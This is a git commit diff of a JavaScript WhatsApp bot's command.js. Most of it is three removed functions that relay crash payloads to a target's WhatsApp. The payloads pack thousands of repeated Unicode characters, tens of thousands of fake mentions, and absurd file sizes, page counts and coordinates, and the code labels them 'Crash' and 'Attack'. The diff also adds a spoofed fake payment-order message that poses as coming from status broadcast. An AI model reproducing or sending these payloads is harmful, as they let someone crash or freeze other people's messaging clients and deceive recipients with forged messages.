91704f8e18fbd85461d19a9495fff53a49ad8f5c
zax-universe <azaxsql@gmail.com>
2026-02-10 10:46:54 +0700

    Update command.js

--- command.js
+++ command.js
@@ -234,161 +234,60 @@ if (command) {
 }
 
 //FUNCTION
-async function exoticsChronos(zax, jid, etc = true) {
-      await zax.relayMessage(jid, {
-        ephemeralMessage: {
-          message: {
-            interactiveMessage: {
-              header: {
-                documentMessage: {
-                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
-                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-                  fileLength: "9999999999999",
-                  pageCount: 1316134911,
-                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
-                  fileName: "exotics.zip",
-                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
-                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
-                  mediaKeyTimestamp: "1726867151",
-                  contactVcard: true,
-                  jpegThumbnail: ""
-                },
-                hasMediaAttachment: true
-              },
-              body: {
-                text: "Exotics-\n" + 'ꦽ'.repeat(1000) + "@13135550202".repeat(15000)
-              },
-              nativeFlowMessage: {},
-              contextInfo: {
-                mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({
-                  length: 2000
-                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
-                forwardingScore: 1,
-                isForwarded: true,
-                fromMe: false,
-                participant: "0@s.whatsapp.net",
-                remoteJid: "status@broadcast",
-                quotedMessage: {
-                  documentMessage: {
-                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
-                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-                    fileLength: "9999999999999",
-                    pageCount: 1316134911,
-                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
-                    fileName: "exotics.doc",
-                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
-                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
-                    mediaKeyTimestamp: "1724474503",
-                    contactVcard: true,
-                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
-                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
-                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
-                    jpegThumbnail: ""
-                  }
-                }
-              }
-            }
-          }
-        }
-      }, etc ? {
-        participant: { jid: jid }
-    } : {});
- }
 
-async function Relog(target) {
-  const Crash = {
-    viewOnceMessage: {
-      message: {
-        interactiveResponseMessage: {
-          body: {
-            text: "⛧ 𝐘𝐳𝐱 ⛧  \n" + 
-            "ꦾ".repeat(30000),
-            format: "DEFAULT",
-            contextInfo: {
-              mentionedJid: [
-                target,
-                "0@s.whatsapp.net",
-                ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
-              ],
-              disappearingMode: {
-                initiator: "CHANGED_IN_CHAT",
-                trigger: "CHAT_SETTING"
-              },
-            }
-          },
-          nativeFlowResponseMessage: {
-            name: "call_permission_request", 
-            paramsJson: "\u9999".repeat(50000) + "\u9999".repeat(50000), 
-            version: 3
-          }
-        }
-      }
-    }
-  };
-
-  await zax.relayMessage(target, Crash, {
-    participant: { jid: target }
-  });
-							 }
-		
-async function legacyX7(target) {
-const xput = "𑜦𑜠".repeat(1000) + "ꦾ".repeat(1000);
-  try {
-    const message = {
-      viewOnceMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              title: xput,
-              hasMediaAttachment: false,
-              locationMessage: {
-                degreesLatitude: -6666666666,
-                degreesLongitude: 6666666666,
-                name: xput,
-                address: "\u0000",
-              },
-            },
-            body: {
-              text: "LegacyX7 Attack🍁" + xput,
-            },
-            nativeFlowResponseMessage: {
-              name: "payment_transaction_details",
-              paramsJson: "\u08A0".repeat(10000),
-              version: 3
-            },
-            contextInfo: {
-              participant: target,
-                mentionedJid: [
-                  "0@s.whatsapp.net",
-                 ...Array.from(
-                 { length: 1900 },
-                 () =>
-                 "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
-                ),
-              ],
-            },
-          }, 
-        },
-      },
-    };
-    
-    //const msg = generateWAMessageFromContent(target, message, {});
-
-    await zax.relayMessage(target, message, {
-      messageId: null,
-      participant: { jid: target },
-      userJid: target,
-      });
-
-    console.log("Succes Attack!✅");
-  } catch (error) {
-    console.log("❌ error:\n" + error);
-  }
-}
+              
+            
 
 // end
+const rnp = {
+  key: {
+    fromMe: false,
+    participant: "0@s.whatsapp.net",
+    remoteJid: "status@broadcast"
+  },
+  message: {
+    interactiveMessage: {
+      header: {
+        hasMediaAttachment: true,
+        jpegThumbnail: fs.readFileSync('./Images/img.jpg')
+      },
+      nativeFlowMessage: {
+        buttons: [
+          {
+            name: "review_and_pay",
+            buttonParamsJson: JSON.stringify({
+              currency: "IDR",
+              payment_configuration: "",
+              payment_type: "",
+              total_amount: { value: 72050000, offset: 100 },
+              reference_id: "X",
+              type: "physical-goods",
+              order: {
+                status: "preparing_to_ship",
+                description: "",
+                subtotal: { value: 72050000, offset: 100 },
+                order_type: "ORDER",
+                items: [
+                  {
+                    retailer_id: "25127408720248432",
+                    product_id: "25127408720248432",
+                    name: "PDF's - WaBot",
+                    amount: { value: 72050000, offset: 100 },
+                    quantity: 1
+                  }
+                ]
+              },
+              additional_note: "",
+              native_payment_methods: [],
+              share_payment_status: false
+            })
+          }
+        ]
+      }
+    }
+  }
+				}
+		
 const zets = {
   key: {
 	fromMe: false,
